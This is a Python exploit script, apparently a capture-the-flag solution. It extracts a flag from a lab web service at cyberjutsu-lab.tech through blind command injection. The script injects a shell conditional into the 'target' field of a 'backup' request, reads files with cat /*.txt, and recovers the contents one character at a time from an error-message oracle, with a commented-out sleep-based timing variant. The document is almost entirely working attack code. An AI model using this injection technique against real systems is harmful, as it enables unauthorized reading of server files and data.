import string
import requests
import time

url='http://cmdi.cyberjutsu-lab.tech:3006/'
#payload="; if [ $(cat /*.txt | head -n1 | cut -c{offset}) = '{character}' ]; then sleep 3; fi;"
payload="a /tmp; if [ $(cat /*.txt | head -n1 | cut -c{offset}) = '{character}' ]; then echo 'zip error'; fi;"
CHARSET=string.printable
# cmd=payload.format(offset=1,character='C')
# rev=requests.post(url,data={
# 'command':'backup',
# 'target':cmd
# })
# print(rev.content)
result =""
j=1
while 1:
    for i in CHARSET:
        cmd=payload.format(offset=j,character=i)
     
        #start=time.time()
        rev=requests.post(url,data={
          	'command':'backup',
          	'target':cmd
     	})
        #end=time.time()     
        #delay=end-start
        # print(cmd)
        # print(rev.content)
        if rev.content==b'Backup kh\xc3\xb4ng th\xc3\xa0nh c\xc3\xb4ng':
        #if delay>2:
            result+=i
            print(result)
            break
    if result[len(result)-1] == '}':
       break
    j=j+1
print(result)

